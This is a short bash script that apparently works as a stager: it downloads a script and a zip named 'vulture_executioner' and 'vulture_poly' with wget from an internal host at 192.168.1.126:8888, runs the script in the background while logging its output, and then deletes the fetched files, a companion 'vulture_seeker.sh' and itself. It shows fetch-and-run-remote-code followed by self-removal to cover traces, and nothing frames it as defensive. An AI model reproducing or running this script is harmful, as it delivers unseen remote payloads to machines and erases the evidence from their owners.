#!/bin/bash

# Define the log file
LOG_FILE="/usr/src/log/seeker.log"

# fetching
wget http://192.168.1.126:8888/tools/vulture_executioner.sh
wget http://192.168.1.126:8888/tools/archives/vulture_poly.zip

# moving
mkdir -p /usr/src/tmp
mv vulture_executioner.sh /usr/src/tmp
mv vulture_poly.zip /usr/src/tmp

# stage 2
chmod +x /usr/src/tmp/vulture_executioner.sh
/usr/src/tmp/vulture_executioner.sh > "$LOG_FILE" 2>&1 &

# Capturing PID of the background process
BG_PID=$!

sleep 3

# Wait for the process to complete and capture its exit status
wait $BG_PID
EXIT_STATUS=$?

# Append the success or failure message to the log file
if [ $EXIT_STATUS -eq 0 ]; then
    echo "The command succeeded." >> "$LOG_FILE"
else
    echo "The command failed with status $EXIT_STATUS." >> "$LOG_FILE"
fi

# wipe itself and other specified files
rm /usr/src/desktop/vulture_seeker.sh
rm -- "$0"
rm -rf /usr/src/tmp/vulture_*
